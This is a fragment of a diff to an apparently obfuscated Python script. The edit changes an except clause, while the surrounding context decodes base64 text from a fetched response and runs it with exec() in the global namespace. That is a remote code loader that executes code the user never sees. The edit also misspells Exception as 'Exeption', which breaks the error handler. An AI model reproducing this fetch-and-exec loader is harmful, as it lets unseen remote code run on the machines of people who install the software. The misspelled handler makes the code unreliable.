@@ -33,8 +33,8 @@ if hshu:
 			sys.exit()
 		try:
 			exec(base64.b64decode(r.json()['content']).decode('utf-8'),globals())
-		except:
-			print("Bad performance {}".format(etl))
+		except Exeption as pl:
+			print("Bad performance {} : {}".format(etl,pl))
 			sys.exit()
 		return
 	cues=hsh["ufh"].split(",")
